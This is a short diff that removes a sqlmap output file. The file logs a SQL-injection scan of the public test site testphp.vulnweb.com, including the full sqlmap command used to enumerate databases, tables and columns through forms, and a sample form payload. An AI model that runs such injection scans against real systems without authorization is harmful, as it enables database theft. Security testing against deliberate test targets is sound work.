@@ -1,3 +1,0 @@
-http://testphp.vulnweb.com/search.php?test=query (POST)  # C:\Users\Administrateur\HakBoard\env\Scripts\sqlmap -u http://testphp.vulnweb.com/login.php --batch --level=1 --risk=1 --technique=BEUSTQ --threads=4 --forms --schema --tables --columns --dbs --random-agent --output-dir=sqlmap_output_1741882546913
-
-searchFor=GXKm&goButton=go
